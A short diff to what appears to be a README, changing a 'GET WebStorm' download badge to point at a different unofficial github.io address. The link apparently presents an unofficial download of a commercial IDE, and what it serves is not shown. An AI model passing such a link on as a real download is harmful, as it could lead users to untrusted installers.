@@ -7,7 +7,7 @@
 <br>   
 
 <div align="center">  
-<a href="https://macos-25.github.io/.github/">  
+<a href="https://osx-app.github.io/.github/webstorm">  
 <img src="https://img.shields.io/badge/💻_GET_WebStorm-green?style=for-the-badge&logo=apple" alt="GET WebStorm">  
 </a>  
 </div>  
